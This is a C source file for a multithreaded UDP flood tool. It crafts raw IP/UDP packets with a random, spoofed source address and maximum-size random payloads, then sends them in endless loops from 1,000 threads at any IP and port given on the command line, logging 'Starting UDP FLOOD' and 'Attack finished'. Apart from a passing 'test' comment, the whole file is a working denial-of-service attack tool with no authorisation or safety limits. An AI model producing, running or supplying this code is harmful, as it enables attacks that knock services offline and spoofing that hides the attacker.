#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 65507  // Max UDP payload (for fragmentation)
#define THREAD_COUNT 1000   // More threads = more packets
#define FLOOD_DURATION 120  // Test for 120 seconds

// Raw UDP packet structure
struct udp_packet {
    struct iphdr ip_header;
    struct udphdr udp_header;
    char payload[PAYLOAD_SIZE];
};

void *udp_flood(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sock < 0) {
        perror("socket (raw)");
        return NULL;
    }

    // Craft UDP packet
    struct udp_packet packet;
    memset(&packet, 0, sizeof(packet));

    // IP header
    packet.ip_header.ihl = 5;
    packet.ip_header.version = 4;
    packet.ip_header.tot_len = htons(sizeof(packet));
    packet.ip_header.id = htons(rand());
    packet.ip_header.ttl = 64;
    packet.ip_header.protocol = IPPROTO_UDP;
    packet.ip_header.saddr = rand();  // Spoofed source IP (optional)
    packet.ip_header.daddr = target->sin_addr.s_addr;

    // UDP header
    packet.udp_header.source = htons(rand() % 65535);
    packet.udp_header.dest = target->sin_port;
    packet.udp_header.len = htons(PAYLOAD_SIZE + 8);
    
    // Fill payload with random data
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        packet.payload[i] = rand() % 256;
    }

    // Flood loop
    while (1) {
        sendto(sock, &packet, sizeof(packet), 0, 
               (struct sockaddr *)target, sizeof(*target));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    // Set target
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &target.sin_addr);

    printf("[!] Starting UDP FLOOD on %s:%s\n", argv[1], argv[2]);

    // Launch threads
    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &target);
    }

    sleep(FLOOD_DURATION);  // Run for 120 seconds
    printf("[+] Attack finished\n");
    return 0;
}
